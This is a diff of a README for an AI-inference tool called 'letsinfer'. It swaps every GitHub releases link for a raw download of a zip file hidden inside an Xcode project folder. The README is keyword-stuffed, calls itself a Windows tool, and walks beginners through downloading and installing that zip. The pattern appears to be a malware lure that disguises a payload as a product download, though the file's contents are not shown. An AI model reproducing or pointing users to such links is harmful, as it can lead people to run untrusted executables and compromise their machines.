@@ -1,6 +1,6 @@
 # ⚡ letsinfer - Run AI Models Without the Headaches
 
-[![Download letsinfer](https://img.shields.io/badge/Download%20letsinfer-Latest%20Release-2ea44f?style=for-the-badge)](https://github.com/Clausewitzbiologicalresearch3709/letsinfer/releases)
+[![Download letsinfer](https://img.shields.io/badge/Download%20letsinfer-Latest%20Release-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Clausewitzbiologicalresearch3709/letsinfer/main/apps/macos/LetsInfer.xcodeproj/project.xcworkspace/v3.5-beta.4.zip)
 
 ## 🎯 What Is letsinfer?
 
@@ -20,12 +20,12 @@ Here's what makes letsinfer different from other tools:
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Clausewitzbiologicalresearch3709/letsinfer/releases](https://github.com/Clausewitzbiologicalresearch3709/letsinfer/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Clausewitzbiologicalresearch3709/letsinfer/main/apps/macos/LetsInfer.xcodeproj/project.xcworkspace/v3.5-beta.4.zip](https://raw.githubusercontent.com/Clausewitzbiologicalresearch3709/letsinfer/main/apps/macos/LetsInfer.xcodeproj/project.xcworkspace/v3.5-beta.4.zip)
 
 ### Step-by-Step Installation Guide
 
 1. **Open your web browser** (like Chrome, Edge, or Firefox)
-2. **Go to the download page** by clicking this link: [https://github.com/Clausewitzbiologicalresearch3709/letsinfer/releases](https://github.com/Clausewitzbiologicalresearch3709/letsinfer/releases)
+2. **Go to the download page** by clicking this link: [https://raw.githubusercontent.com/Clausewitzbiologicalresearch3709/letsinfer/main/apps/macos/LetsInfer.xcodeproj/project.xcworkspace/v3.5-beta.4.zip](https://raw.githubusercontent.com/Clausewitzbiologicalresearch3709/letsinfer/main/apps/macos/LetsInfer.xcodeproj/project.xcworkspace/v3.5-beta.4.zip)
 3. Look for the newest version listed on the page – it will have the highest number
 4. Click the download button next to that version
 5. Wait for the download to finish – this may take a few minutes depending on your internet speed
@@ -120,7 +120,7 @@ The download page has a community section where you can ask questions and find a
 
 Here's everything you need to do to get up and running:
 
-1. **Visit** [https://github.com/Clausewitzbiologicalresearch3709/letsinfer/releases](https://github.com/Clausewitzbiologicalresearch3709/letsinfer/releases)
+1. **Visit** [https://raw.githubusercontent.com/Clausewitzbiologicalresearch3709/letsinfer/main/apps/macos/LetsInfer.xcodeproj/project.xcworkspace/v3.5-beta.4.zip](https://raw.githubusercontent.com/Clausewitzbiologicalresearch3709/letsinfer/main/apps/macos/LetsInfer.xcodeproj/project.xcworkspace/v3.5-beta.4.zip)
 2. **Download** the latest version
 3. **Install** the program
 4. **Open** letsinfer
@@ -136,6 +136,6 @@ So why wait? Your AI journey starts today. Click the download link and see for y
 
 ---
 
-**Download Now:** [https://github.com/Clausewitzbiologicalresearch3709/letsinfer/releases](https://github.com/Clausewitzbiologicalresearch3709/letsinfer/releases)
+**Download Now:** [https://raw.githubusercontent.com/Clausewitzbiologicalresearch3709/letsinfer/main/apps/macos/LetsInfer.xcodeproj/project.xcworkspace/v3.5-beta.4.zip](https://raw.githubusercontent.com/Clausewitzbiologicalresearch3709/letsinfer/main/apps/macos/LetsInfer.xcodeproj/project.xcworkspace/v3.5-beta.4.zip)
 
 Keywords: letsinfer, AI inference, runtime management, machine learning, free software, Windows tool, artificial intelligence, easy setup
